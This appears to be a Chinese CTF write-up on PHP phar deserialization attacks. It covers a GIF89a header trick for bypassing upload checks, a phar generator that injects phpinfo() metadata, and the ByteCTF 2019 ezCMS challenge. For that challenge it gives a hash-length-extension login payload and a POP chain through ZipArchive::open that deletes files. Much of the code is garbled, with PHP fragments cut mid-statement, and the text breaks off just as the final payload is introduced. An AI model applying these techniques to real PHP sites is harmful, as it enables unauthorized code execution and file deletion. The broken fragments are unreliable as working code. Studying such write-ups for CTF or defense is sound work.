        if (file_exists("upload_file/" . $_FILES["file"]["name"]))
          {
          echo $_FILES["file"]["name"] . " already exists. ";
          }
        else
          {
          move_uploaded_file($_FILES["file"]["tmp_name"],
          "upload_file/" .$_FILES["file"]["name"]);
          echo "Stored in: " . "upload_file/" . $_FILES["file"]["name"];
          }
        }
    else
      {
      echo "Invalid file,you can only upload gif";
      }
index.php
     data);
        }
    }
    if ($_GET["file"]){
        file_exists($_GET["file"]);
    }
绕过思路：GIF格式验证可以通过在文件头部添加GIF89a绕过
我们可以构造一个php来生成phar.phar。
    startBuffering();
        $phar->setStub("GIF89a".""); //设置stub
        $o = new TestObject();
        $o -> data='phpinfo();'; //控制TestObject中的data为phpinfo()。
        $phar->setMetadata($o); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
    ?>
利用过程：
  * 一、生成一个phar.phar，修改后缀名为phar.gif
  * 二、上传到upload_file目录下
  * 三、访问：
可见已经执行了phpinfo命令了。
通过修改后缀名和文件头，能够绕过大部分的校验。
#### 配合PHP内核哈希表碰撞攻击
参考：
## 原生类序列化(ZipArchive::open)
拿这次2019 ByteCTF的ezCMS这道题来学习这个知识点。
先是哈希长度扩展攻击 [参考](https://www.cnblogs.com/pcat/p/5478509.html)
    登录账户：admin
    登录密码：admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00test
    置cookie：user=2e05fd4ee5d0ec7853d174d06cd3ca47;
config.php：
    filename = $filename;
        }
        function check(){
            $content = file_get_contents($this->filename);
            $black_list = ['system','eval','exec','+','passthru','`','assert']; // 检查了文件中的一些关键字
            foreach ($black_list as $k=>$v){
                if (stripos($content, $v) !== false){
                    die("your file make me scare");
                }
            }
            return 1;
        }
    }
    class File{
        public $filename;
        public $filepath;
        public $checker;
        function __construct($filename, $filepath)
        {
            $this->filepath = $filepath;
            $this->filename = $filename;
        }
        public function view_detail(){
            if (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath)){
                die("nonono~");
            }   
            $mine = mime_content_type($this->filepath); //这里可以触发phar反序列化
            $store_path = $this->open($this->filename, $this->filepath);
            $res['mine'] = $mine;
            $res['store_path'] = $store_path;
            return $res;
        }
        public function open($filename, $filepath){
            $res = "$filename is in $filepath";
            return $res;
        }
        function __destruct()   //类被销毁时自动触发
        {
            if (isset($this->checker)){
                $this->checker->upload_file();   //调用upload_file()方法
            }
        }
    }
    class Admin{
        public $size;
        public $checker;
        public $file_tmp;
        public $filename;
        public $upload_dir;
        public $content_check;
        function __construct($filename, $file_tmp, $size)
        {
            $this->upload_dir = 'sandbox/'.md5($_SERVER['REMOTE_ADDR']);
            if (!file_exists($this->upload_dir)){
                mkdir($this->upload_dir, 0777, true);
            }
            if (!is_file($this->upload_dir.'/.htaccess')){
                file_put_contents($this->upload_dir.'/.htaccess', 'lolololol, i control all');
            }
            $this->size = $size;
            $this->filename = $filename;
            $this->file_tmp = $file_tmp;
            $this->content_check = new Check($this->file_tmp);
            $profile = new Profile();
            $this->checker = $profile->is_admin();
        }
        public function upload_file(){
            if (!$this->checker){
                die('u r not admin');
            }
            $this->content_check -> check();
            $tmp = explode(".", $this->filename);
            $ext = end($tmp); // 
            if ($this->size > 204800){
                die("your file is too big");
            }
            # 
            move_uploaded_file($this->file_tmp, $this->upload_dir.'/'.md5($this->filename).'.'.$ext);
        }
        public function __call($name, $arguments)
        {
        }
    }
    class Profile{
        public $username;
        public $password;
        public $admin;
        public function is_admin(){
            //从SESSION当中取用户名和密码
            $this->username = $_SESSION['username'];
            $this->password = $_SESSION['password'];
            $secret = "********";
            if ($this->username === "admin" && $this->password != "admin"){
                if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                    return 1;
                }
            }
            return 0;
        }
        function __call($name, $arguments) //当调用不存在的方式时触发
        {
            $this->admin->open($this->username, $this->password); //这里作为
        }
    }
view.php:
    view_detail();                //调用view_detail方法
    $mine = $res['mine'];
    $store_path = $res['store_path'];
    echo 
    mine: {$mine}
    file_path: {$store_path}
    EOT;
    ?>
在view.php中，url中传递的filename与filepath进行一次url编码之后传递到File类中调用view_detail方法。
view_detail方法中存在一个`mime_content_type()`函数, 这个函数是可以导致phar反序列化的。
在此之前：
    if (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath)){
                die("nonono~");
            }
这个正则禁止了大部分的进行phar反序列化的关键词，不允许这些关键词出现在filepath的开头。但是这里漏了一个php://协议。
[参考SUCTF](https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/)
找到了phar反序列化触发点之后，开始构造一条可利用的POP链，思路：
  1. File类的`__destruct()`会调用`$this->checker->upload_file()`。可以将`$this->checker`赋值为Profile类
  2. 因为`$this->checker`没有Profile类，触发`__call()`魔术方法
  3. 调用`$this->admin->open($this->username, $this->password);` 这里可以使用原生类反序列化
原生类反序列化[参考](https://xi4or0uji.github.io/2019/06/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%B1%E6%B5%85%E5%88%B0%E6%B7%B1/)
简要笔记：
    利用PHP函数 ZipArchive::open($filename, $flags)
    当$flag=ZipArchive::OVERWRITE时，就会将$filename的文件删除
构造Payload：